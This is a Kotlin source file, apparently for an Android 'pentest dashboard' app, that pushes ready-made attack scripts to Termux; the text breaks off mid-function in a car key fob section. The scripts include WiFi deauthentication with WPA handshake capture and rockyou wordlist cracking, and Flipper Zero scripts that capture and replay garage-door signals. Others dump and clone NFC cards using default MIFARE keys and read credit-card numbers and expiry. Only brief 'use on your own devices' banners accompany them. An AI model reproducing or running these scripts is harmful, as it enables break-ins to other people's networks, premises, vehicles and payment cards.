package com.pentest.dashboard

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputEditText
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.NetworkInterface

class MainActivity : AppCompatActivity() {

    private lateinit var outputTextView: TextView
    private lateinit var scrollView: ScrollView
    private lateinit var targetInput: EditText
    private lateinit var wifiSsidInput: EditText
    private lateinit var deviceInfoText: TextView

    private val PERMISSION_REQUEST_CODE = 1001
    private val WORDLIST_URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"

    companion object {
        const val TERMUX_PACKAGE = "com.termux"
        const val TERMUX_SERVICE = "com.termux.app.RunCommandService"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize views
        outputTextView = findViewById(R.id.outputTextView)
        scrollView = findViewById(R.id.scrollView)
        targetInput = findViewById(R.id.targetInput)
        wifiSsidInput = findViewById(R.id.wifiSsidInput)
        deviceInfoText = findViewById(R.id.deviceInfoText)

        // Check and request permissions
        checkPermissions()

        // Load device info
        updateDeviceInfo()

        // Button click listeners
        findViewById<MaterialButton>(R.id.btnUpdatePackages).setOnClickListener {
            executeTermuxCommand("pkg update -y && pkg upgrade -y")
        }

        findViewById<MaterialButton>(R.id.btnInstallTools).setOnClickListener {
            executeTermuxCommand("pkg install nmap git python wget curl termux-api build-essential clang make -y")
        }

        findViewById<MaterialButton>(R.id.btnNmapQuick).setOnClickListener {
            val target = targetInput.text.toString().ifEmpty { "192.168.1.0/24" }
            executeTermuxCommand("nmap -sn $target")
        }

        findViewById<MaterialButton>(R.id.btnNmapDetailed).setOnClickListener {
            val target = targetInput.text.toString().ifEmpty { "192.168.1.1" }
            executeTermuxCommand("nmap -A -T4 $target")
        }

        findViewById<MaterialButton>(R.id.btnArpScan).setOnClickListener {
            executeTermuxCommand("arp-scan --localnet")
        }

        findViewById<MaterialButton>(R.id.btnInstallAircrack).setOnClickListener {
            executeTermuxCommand("cd ~ && git clone https://github.com/aircrack-ng/aircrack-ng && cd aircrack-ng && autoreconf -i && ./configure --with-experimental && make && make install")
        }

        findViewById<MaterialButton>(R.id.btnInstallHashcat).setOnClickListener {
            executeTermuxCommand("cd ~ && git clone https://github.com/hashcat/hashcat && cd hashcat && make && make install")
        }

        findViewById<MaterialButton>(R.id.btnOpenTermux).setOnClickListener {
            openTermux()
        }

        findViewById<MaterialButton>(R.id.btnClearOutput).setOnClickListener {
            outputTextView.text = ""
        }

        findViewById<MaterialButton>(R.id.btnRefreshInfo).setOnClickListener {
            updateDeviceInfo()
            Toast.makeText(this, "Device info refreshed", Toast.LENGTH_SHORT).show()
        }

        // ========== WiFi Hacking Buttons ==========
        findViewById<MaterialButton>(R.id.btnWifiAutoCaptureCrack).setOnClickListener {
            val ssid = wifiSsidInput.text.toString()
            if (ssid.isEmpty()) {
                Toast.makeText(this, "Please enter WiFi SSID", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            executeWifiAutoCaptureCrack(ssid)
        }

        findViewById<MaterialButton>(R.id.btnWifiCaptureHandshake).setOnClickListener {
            val ssid = wifiSsidInput.text.toString()
            if (ssid.isEmpty()) {
                Toast.makeText(this, "Please enter WiFi SSID", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            executeWifiCaptureHandshake(ssid)
        }

        findViewById<MaterialButton>(R.id.btnWifiCrackWithWordlist).setOnClickListener {
            val ssid = wifiSsidInput.text.toString()
            if (ssid.isEmpty()) {
                Toast.makeText(this, "Please enter WiFi SSID", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            executeWifiCrackWithWordlist(ssid)
        }

        // ========== Flipper Zero Buttons ==========
        findViewById<MaterialButton>(R.id.btnFlipperGarageDoor).setOnClickListener {
            executeFlipperGarageDoorAttack()
        }

        findViewById<MaterialButton>(R.id.btnFlipperRFIDRead).setOnClickListener {
            executeFlipperRFIDRead()
        }

        findViewById<MaterialButton>(R.id.btnFlipperNFCRead).setOnClickListener {
            executeFlipperNFCRead()
        }

        findViewById<MaterialButton>(R.id.btnFlipperSubGHzScan).setOnClickListener {
            executeFlipperSubGHzScan()
        }

        findViewById<MaterialButton>(R.id.btnFlipperCarKeyFob).setOnClickListener {
            executeFlipperCarKeyFob()
        }

        findViewById<MaterialButton>(R.id.btnFlipperBadUSB).setOnClickListener {
            executeFlipperBadUSB()
        }

        // ========== AWOK Mini V3 Buttons ==========
        findViewById<MaterialButton>(R.id.btnAwokWiFiWardriving).setOnClickListener {
            executeAwokWardriving()
        }

        findViewById<MaterialButton>(R.id.btnAwokDeauthAttack).setOnClickListener {
            val ssid = wifiSsidInput.text.toString()
            if (ssid.isEmpty()) {
                Toast.makeText(this, "Please enter WiFi SSID", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            executeAwokDeauth(ssid)
        }

        findViewById<MaterialButton>(R.id.btnAwokEvilPortal).setOnClickListener {
            executeAwokEvilPortal()
        }

        findViewById<MaterialButton>(R.id.btnAwokBLEScan).setOnClickListener {
            executeAwokBLEScan()
        }

        // Initial message
        appendOutput("üì± Master Pentest Dashboard Ready\n")
        appendOutput("üê¨ Flipper Zero | üì∂ AWOK Mini V3 | üì° WiFi Cracking\n")
        appendOutput("‚ö†Ô∏è  Only use on networks/devices you OWN\n")
        appendOutput("üí° TIP: Connect Flipper Zero via USB-C for full control\n\n")
    }

    private fun checkPermissions() {
        val permissionsNeeded = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.INTERNET)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_WIFI_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.ACCESS_WIFI_STATE)
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.BLUETOOTH_CONNECT)
            }
        }

        if (permissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun executeTermuxCommand(command: String) {
        appendOutput("\nüöÄ Executing: $command\n")
        appendOutput("‚îÄ".repeat(50) + "\n")

        try {
            // Create intent to execute command via Termux RUN_COMMAND service
            val intent = Intent()
            intent.setClassName(TERMUX_PACKAGE, TERMUX_SERVICE)
            intent.action = "com.termux.RUN_COMMAND"
            intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash")
            intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", arrayOf("-c", command))
            intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", "/data/data/com.termux/files/home")
            intent.putExtra("com.termux.RUN_COMMAND_BACKGROUND", false)
            intent.putExtra("com.termux.RUN_COMMAND_SESSION_ACTION", "0") // 0 = switch to session and run

            // Execute the command
            startService(intent)

            appendOutput("‚úÖ Command sent to Termux!\n")
            appendOutput("üì± Termux will open automatically and execute the command\n")
            appendOutput("üí° Check Termux window for output\n\n")

            Toast.makeText(this, "Command executing in Termux...", Toast.LENGTH_SHORT).show()

            // Optional: Open Termux to show execution
            val termuxIntent = packageManager.getLaunchIntentForPackage(TERMUX_PACKAGE)
            if (termuxIntent != null) {
                // Delay slightly so service starts first
                android.os.Handler(mainLooper).postDelayed({
                    startActivity(termuxIntent)
                }, 300)
            }

        } catch (e: SecurityException) {
            // RUN_COMMAND permission not granted - fallback to clipboard method
            appendOutput("‚ö†Ô∏è  RUN_COMMAND permission denied\n")
            appendOutput("Falling back to clipboard method...\n\n")

            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = ClipData.newPlainText("Termux Command", command)
            clipboard.setPrimaryClip(clip)

            appendOutput("‚úÖ Command copied to clipboard!\n")
            appendOutput("üìã Opening Termux - paste with long-press\n")
            appendOutput("üí° To enable auto-execution:\n")
            appendOutput("   1. Open Termux\n")
            appendOutput("   2. Run: termux-setup-storage\n")
            appendOutput("   3. Grant RUN_COMMAND permission when prompted\n\n")

            val termuxIntent = packageManager.getLaunchIntentForPackage(TERMUX_PACKAGE)
            if (termuxIntent != null) {
                startActivity(termuxIntent)
                Toast.makeText(this, "Command copied! Long-press to paste", Toast.LENGTH_LONG).show()
            } else {
                appendOutput("‚ùå Termux not installed\n")
                appendOutput("Install from: https://f-droid.org/en/packages/com.termux/\n\n")
                val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://f-droid.org/en/packages/com.termux/"))
                startActivity(browserIntent)
            }

        } catch (e: Exception) {
            appendOutput("‚ùå Error: ${e.message}\n")
            appendOutput("Error type: ${e.javaClass.simpleName}\n\n")
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun openTermux() {
        try {
            val intent = packageManager.getLaunchIntentForPackage(TERMUX_PACKAGE)
            if (intent != null) {
                startActivity(intent)
                appendOutput("‚úÖ Opened Termux\n\n")
            } else {
                appendOutput("‚ùå Termux not installed\n")
                appendOutput("Install from: https://f-droid.org/en/packages/com.termux/\n\n")

                // Offer to open F-Droid or browser
                val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://f-droid.org/en/packages/com.termux/"))
                startActivity(browserIntent)
            }
        } catch (e: Exception) {
            appendOutput("‚ùå Error: ${e.message}\n\n")
        }
    }

    private fun appendOutput(text: String) {
        runOnUiThread {
            outputTextView.append(text)
            scrollView.post {
                scrollView.fullScroll(ScrollView.FOCUS_DOWN)
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Some permissions denied. App may not work correctly.", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun updateDeviceInfo() {
        try {
            val info = StringBuilder()

            // Device Model
            info.append("Device: ${Build.MANUFACTURER} ${Build.MODEL}\n")

            // Android Version
            info.append("Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")

            // Get WiFi Info
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wifiInfo = wifiManager.connectionInfo

            if (wifiInfo != null && wifiInfo.ssid != null) {
                val ssid = wifiInfo.ssid.replace("\"", "")
                info.append("WiFi: $ssid\n")

                // Get IP address
                val ipAddress = wifiInfo.ipAddress
                if (ipAddress != 0) {
                    val ip = String.format(
                        "%d.%d.%d.%d",
                        ipAddress and 0xff,
                        ipAddress shr 8 and 0xff,
                        ipAddress shr 16 and 0xff,
                        ipAddress shr 24 and 0xff
                    )
                    info.append("IP: $ip\n")
                }
            } else {
                info.append("WiFi: Not connected\n")
            }

            // Get network interfaces
            val interfaces = NetworkInterface.getNetworkInterfaces()
            if (interfaces != null) {
                for (intf in interfaces) {
                    if (intf.name.startsWith("wlan") || intf.name.startsWith("eth")) {
                        val hwAddr = intf.hardwareAddress
                        if (hwAddr != null && hwAddr.isNotEmpty()) {
                            val mac = hwAddr.joinToString(":") { byte -> "%02X".format(byte) }
                            info.append("MAC (${intf.name}): $mac\n")
                        }
                    }
                }
            }

            deviceInfoText.text = info.toString().trim()
        } catch (e: Exception) {
            deviceInfoText.text = "Error loading device info:\n${e.message}"
        }
    }

    // ========== WiFi Hacking Functions ==========

    private fun executeWifiAutoCaptureCrack(ssid: String) {
        appendOutput("\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n")
        appendOutput("üéØ AUTO WiFi Capture + Crack: $ssid\n")
        appendOutput("‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n\n")

        val script = """
            echo "üì° STEP 1: Setting up WiFi interface for monitor mode..."
            sudo airmon-ng check kill
            sudo airmon-ng start wlan0

            echo ""
            echo "üéØ STEP 2: Scanning for target network..."
            timeout 10s sudo airodump-ng wlan0mon --essid "$ssid" -w /tmp/scan --output-format csv

            BSSID=${'$'}(grep -a "$ssid" /tmp/scan-01.csv | head -n1 | awk -F',' '{print ${'$'}1}' | tr -d ' ')
            CHANNEL=${'$'}(grep -a "$ssid" /tmp/scan-01.csv | head -n1 | awk -F',' '{print ${'$'}4}' | tr -d ' ')

            echo "‚úì Found network: BSSID=${'$'}BSSID, Channel=${'$'}CHANNEL"
            echo ""
            echo "üì¶ STEP 3: Capturing handshake (press Ctrl+C after seeing WPA handshake)..."
            sudo airodump-ng -c ${'$'}CHANNEL --bssid ${'$'}BSSID -w /sdcard/pentest/$ssid wlan0mon &
            CAPTURE_PID=${'$'}!

            sleep 5
            echo ""
            echo "üí• STEP 4: Sending deauth packets to force handshake..."
            sudo aireplay-ng -0 10 -a ${'$'}BSSID wlan0mon

            sleep 15
            kill ${'$'}CAPTURE_PID

            echo ""
            echo "üì• STEP 5: Downloading rockyou.txt wordlist..."
            mkdir -p ~/wordlists
            if [ ! -f ~/wordlists/rockyou.txt ]; then
                wget -O ~/wordlists/rockyou.txt.gz "$WORDLIST_URL"
                gunzip ~/wordlists/rockyou.txt.gz
            fi

            echo ""
            echo "üîì STEP 6: Cracking with aircrack-ng..."
            sudo aircrack-ng -w ~/wordlists/rockyou.txt -b ${'$'}BSSID /sdcard/pentest/${ssid}*.cap

            echo ""
            echo "‚ôªÔ∏è  STEP 7: Restoring WiFi to normal mode..."
            sudo airmon-ng stop wlan0mon
            sudo systemctl start NetworkManager

            echo ""
            echo "‚úÖ COMPLETE! Check output above for cracked password."
        """.trimIndent()

        executeTermuxCommand(script)
        appendOutput("üí° TIP: This process takes 5-15 minutes\n")
        appendOutput("üí° Results saved to: /sdcard/pentest/$ssid/\n\n")
    }

    private fun executeWifiCaptureHandshake(ssid: String) {
        appendOutput("\nüéØ Capturing WPA handshake for: $ssid\n")

        val script = """
            sudo airmon-ng check kill && \
            sudo airmon-ng start wlan0 && \
            timeout 10s sudo airodump-ng wlan0mon --essid "$ssid" -w /tmp/scan --output-format csv && \
            BSSID=${'$'}(grep -a "$ssid" /tmp/scan-01.csv | head -n1 | awk -F',' '{print ${'$'}1}' | tr -d ' ') && \
            CHANNEL=${'$'}(grep -a "$ssid" /tmp/scan-01.csv | head -n1 | awk -F',' '{print ${'$'}4}' | tr -d ' ') && \
            echo "Found: BSSID=${'$'}BSSID, Channel=${'$'}CHANNEL" && \
            sudo airodump-ng -c ${'$'}CHANNEL --bssid ${'$'}BSSID -w /sdcard/pentest/$ssid wlan0mon &
            sleep 5 && \
            sudo aireplay-ng -0 10 -a ${'$'}BSSID wlan0mon && \
            sleep 15 && \
            killall airodump-ng && \
            sudo airmon-ng stop wlan0mon && \
            echo "‚úÖ Handshake saved to /sdcard/pentest/${ssid}*.cap"
        """.trimIndent()

        executeTermuxCommand(script)
    }

    private fun executeWifiCrackWithWordlist(ssid: String) {
        appendOutput("\nüîì Cracking WiFi with online wordlist...\n")

        val script = """
            mkdir -p ~/wordlists && \
            if [ ! -f ~/wordlists/rockyou.txt ]; then
                echo "üì• Downloading rockyou.txt (133MB)..."
                wget -O ~/wordlists/rockyou.txt.gz "$WORDLIST_URL" && \
                gunzip ~/wordlists/rockyou.txt.gz
            fi && \
            echo "üîì Starting aircrack-ng..." && \
            aircrack-ng -w ~/wordlists/rockyou.txt /sdcard/pentest/${ssid}*.cap
        """.trimIndent()

        executeTermuxCommand(script)
        appendOutput("üí° This may take several minutes...\n\n")
    }

    // ========== Flipper Zero Functions ==========

    private fun executeFlipperGarageDoorAttack() {
        appendOutput("\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n")
        appendOutput("üöó Flipper Zero: Garage Door Brute Force\n")
        appendOutput("‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n\n")
        appendOutput("üìã STEP-BY-STEP GUIDE:\n\n")
        appendOutput("1Ô∏è‚É£  Connect Flipper Zero to phone via USB-C\n")
        appendOutput("2Ô∏è‚É£  Install pyFlipper: pip install pyflipper\n")
        appendOutput("3Ô∏è‚É£  Run the attack script below:\n\n")

        val script = """
            # Install pyFlipper if not already installed
            pip install pyflipper || echo "pyFlipper already installed"

            # Create garage door brute force script
            cat > /tmp/flipper_garage_bruteforce.py << 'FLIPPER_SCRIPT'
import serial
import time

# Connect to Flipper Zero via USB
flipper = serial.Serial('/dev/ttyACM0', 115200, timeout=1)

print("üê¨ Connected to Flipper Zero")
print("üöó Starting garage door frequency scan...")

# Common garage door frequencies (MHz)
frequencies = [300, 310, 315, 318, 390, 433.92]

for freq in frequencies:
    print(f"üì° Testing frequency: {freq} MHz")

    # Set frequency and start Sub-GHz RX
    flipper.write(f"subghz rx {freq}\\r\\n".encode())
    time.sleep(5)

    # Read captured signals
    flipper.write(b"subghz decode_raw\\r\\n")
    response = flipper.read(1024).decode()

    if "Protocol" in response:
        print(f"‚úÖ FOUND SIGNAL at {freq} MHz!")
        print(response)

        # Save the signal
        flipper.write(f"subghz save garage_door_{freq}\\r\\n".encode())
        print("üíæ Signal saved! You can now replay it from Flipper menu.")

    time.sleep(1)

print("‚úÖ Scan complete!")
flipper.close()
FLIPPER_SCRIPT

            # Run the script
            python /tmp/flipper_garage_bruteforce.py
        """.trimIndent()

        executeTermuxCommand(script)
        appendOutput("\nüí° ALTERNATIVE: Use Flipper Zero directly:\n")
        appendOutput("   Sub-GHz ‚Üí Read ‚Üí Scan frequencies around 315/433 MHz\n")
        appendOutput("   Save captured signal ‚Üí Replay when needed\n\n")
    }

    private fun executeFlipperRFIDRead() {
        appendOutput("\nüè∑Ô∏è  Flipper Zero: RFID Read & Clone\n\n")
        appendOutput("üìã INSTRUCTIONS:\n")
        appendOutput("1. Connect Flipper Zero via USB-C\n")
        appendOutput("2. On Flipper: Go to 125 kHz RFID ‚Üí Read\n")
        appendOutput("3. Place card/tag on Flipper's back\n")
        appendOutput("4. Save the tag when detected\n")
        appendOutput("5. To clone: 125 kHz RFID ‚Üí Saved ‚Üí Select tag ‚Üí Emulate\n\n")

        val script = """
            # Install screen for serial communication
            pkg install screen -y

            # Connect to Flipper Zero
            echo "üê¨ Connecting to Flipper Zero..."
            echo "Run these commands in Flipper CLI:"
            echo "  rfid read"
            echo "  rfid save my_card"
            echo "  rfid emulate my_card"
            echo ""
            echo "Opening serial connection (Ctrl+A, K to exit)..."
            screen /dev/ttyACM0 115200
        """.trimIndent()

        executeTermuxCommand(script)
    }

    private fun executeFlipperNFCRead() {
        appendOutput("\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n")
        appendOutput("üí≥ Flipper Zero: NFC Card Full Dump\n")
        appendOutput("‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n\n")
        appendOutput("üìã READING ALL NFC DATA + SECURITY INFO:\n\n")

        val script = """
            echo "üí≥ NFC Card Reader - Full Dump with Security Info"
            echo "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ"
            echo ""
            echo "üì° SUPPORTED CARD TYPES:"
            echo "   ‚Ä¢ MIFARE Classic (1K, 4K)"
            echo "   ‚Ä¢ MIFARE Ultralight"
            echo "   ‚Ä¢ NTAG213/215/216"
            echo "   ‚Ä¢ EMV (Credit/Debit cards - read only)"
            echo "   ‚Ä¢ NFC-A, NFC-B, NFC-F protocols"
            echo ""

            pip install pyserial pynfc || echo "Dependencies ready"

            cat > /tmp/nfc_full_dump.py << 'NFCDUMP'
import serial
import time

print("üí≥ NFC Full Dump Script")
print("=" * 60)

# Connect to Flipper Zero
try:
    flipper = serial.Serial('/dev/ttyACM0', 115200, timeout=2)
    print("‚úÖ Connected to Flipper Zero")
except:
    print("‚ùå Error: Connect Flipper Zero via USB-C")
    exit(1)

print("\nüì± Place NFC card on Flipper's back...")
print("Reading in 3 seconds...")
time.sleep(3)

# Start NFC detection
print("\nüîç Detecting card type...")
flipper.write(b"nfc detect\\r\\n")
time.sleep(2)

response = flipper.read(4096).decode()
print(response)

# Check card type from response
if "MIFARE" in response:
    card_type = "MIFARE"
elif "NTAG" in response:
    card_type = "NTAG"
elif "EMV" in response:
    card_type = "EMV"
else:
    card_type = "Unknown"

print(f"\nüíæ Card Type: {card_type}")

# Read full dump
print("\nüìä Reading ALL sectors and blocks...")
flipper.write(b"nfc read\\r\\n")
time.sleep(5)

dump = flipper.read(8192).decode()
print(dump)

# Save to file
timestamp = time.strftime("%Y%m%d_%H%M%S")
filename = f"/sdcard/pentest/nfc_dump_{timestamp}.txt"

with open(filename, 'w') as f:
    f.write("=" * 60 + "\\n")
    f.write("NFC CARD FULL DUMP\\n")
    f.write("=" * 60 + "\\n")
    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\\n")
    f.write(f"Card Type: {card_type}\\n")
    f.write("=" * 60 + "\\n\\n")
    f.write(dump)

print(f"\nüíæ Dump saved: {filename}")

# Extract security info
print("\nüîê SECURITY ANALYSIS:")
print("-" * 60)

if "MIFARE" in card_type:
    print("üîê MIFARE Security:")
    print("   ‚Ä¢ Reading access bits...")

    flipper.write(b"nfc info\\r\\n")
    time.sleep(2)
    security_info = flipper.read(4096).decode()

    if "Key A" in security_info or "Key B" in security_info:
        print("   ‚úÖ Found authentication keys!")
        print(security_info)
    else:
        print("   ‚ö†Ô∏è  Protected sectors detected")
        print("   üí° Attempting known key dictionary attack...")

        # Try default keys
        default_keys = [
            "FFFFFFFFFFFF",  # Factory default
            "A0A1A2A3A4A5",  # MAD key
            "D3F7D3F7D3F7",  # NDEF key
            "000000000000",  # Blank key
            "B0B1B2B3B4B5",
            "4D3A99C351DD",
            "1A982C7E459A",
        ]

        for key in default_keys:
            print(f"   Trying key: {key}...")
            cmd = f"nfc mf_classic_dict_attack {key}\\r\\n"
            flipper.write(cmd.encode())
            time.sleep(1)

            result = flipper.read(2048).decode()
            if "SUCCESS" in result or "Found" in result:
                print(f"   ‚úÖ KEY FOUND: {key}")
                break

elif "NTAG" in card_type:
    print("üîê NTAG Security:")
    print("   ‚Ä¢ Password protection: Checking...")

    flipper.write(b"nfc ntag_pwd_auth\\r\\n")
    time.sleep(1)

    if "AUTHLIM" in flipper.read(1024).decode():
        print("   ‚ö†Ô∏è  Password protected (tries limited)")
        print("   üí° Attempting default passwords...")

        default_pwds = [
            "FFFFFFFF",  # Default
            "00000000",  # Blank
        ]

        for pwd in default_pwds:
            print(f"   Trying: {pwd}...")
            flipper.write(f"nfc ntag_pwd {pwd}\\r\\n".encode())
            time.sleep(0.5)
    else:
        print("   ‚úÖ No password protection")

elif "EMV" in card_type:
    print("üîê EMV (Credit Card) Security:")
    print("   ‚ö†Ô∏è  Cannot clone (encryption protected)")
    print("   ‚úÖ Can read: Card number, expiry, transaction history")

    flipper.write(b"nfc emv_read\\r\\n")
    time.sleep(3)

    emv_data = flipper.read(4096).decode()
    print(emv_data)

print("\nüéØ CLONE INSTRUCTIONS:")
print("-" * 60)

if "MIFARE" in card_type or "NTAG" in card_type:
    print("To clone this card:")
    print("1. Insert blank NFC card")
    print("2. On Flipper: NFC ‚Üí Saved ‚Üí Select dump")
    print("3. Choose 'Write' and confirm")
    print("4. Done! Cloned card ready.")
else:
    print("‚ö†Ô∏è  This card type cannot be cloned")
    print("(EMV cards use encryption and dynamic CVV)")

print("\nüê¨ Done! Closing Flipper connection...")
flipper.close()

print("\nüìä SUMMARY SAVED TO:")
print(f"   {filename}")
NFCDUMP

            echo ""
            echo "‚ñ∂Ô∏è  Run: python /tmp/nfc_full_dump.py"
            echo ""
            echo "üí° TIPS:"
            echo "   ‚Ä¢ Hold card steady for 5 seconds"
            echo "   ‚Ä¢ Works through phone case (usually)"
            echo "   ‚Ä¢ Blank NFC cards: NTAG215 on Amazon (~\$1 each)"
        """.trimIndent()

        executeTermuxCommand(script)
        appendOutput("\n‚ö†Ô∏è  LEGAL: Only clone YOUR OWN cards/tags!\n\n")
    }

    private fun executeFlipperSubGHzScan() {
        appendOutput("\nüì° Flipper Zero: Sub-GHz Frequency Scan\n\n")
        appendOutput("üìã STEP-BY-STEP:\n")
        appendOutput("1. Connect Flipper via USB-C\n")
        appendOutput("2. Use script below OR manually:\n")
        appendOutput("   ‚Ä¢ Sub-GHz ‚Üí Read\n")
        appendOutput("   ‚Ä¢ Start scanning\n")
        appendOutput("   ‚Ä¢ Press button on remote/key fob\n")
        appendOutput("   ‚Ä¢ Save captured signal\n\n")

        val script = """
            echo "üê¨ Flipper Zero Sub-GHz Scanner"
            echo "This will scan common frequencies: 300-433 MHz"
            echo ""
            echo "Connect Flipper and press remote buttons nearby..."

            # You can also use Flipper CLI directly
            python3 << 'PYEND'
import serial
import time

try:
    flipper = serial.Serial('/dev/ttyACM0', 115200, timeout=1)
    print("‚úÖ Connected to Flipper Zero")

    # Start frequency analyzer
    flipper.write(b"subghz frequency_analyzer\\r\\n")
    print("üì° Frequency analyzer started - press buttons on remotes!")
    print("(Scanning for 30 seconds...)")

    time.sleep(30)

    flipper.write(b"\\x03")  # Ctrl+C to stop
    print("‚úÖ Scan complete!")
    flipper.close()

except Exception as e:
    print(f"‚ùå Error: {e}")
    print("Make sure Flipper is connected via USB-C")
PYEND
        """.trimIndent()

        executeTermuxCommand(script)
    }

    private fun executeFlipperCarKeyFob() {
        appendOutput("\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n")
        appendOutput("üöó Flipper Zero: Car Key Fob Brute Force\n")
        appendOutput("‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n\n")
        appendOutput("üìã CAR KEY FOB ATTACK METHODS:\n\n")

        val script = """
            echo "üöó Car Key Fob Brute Force Attack"
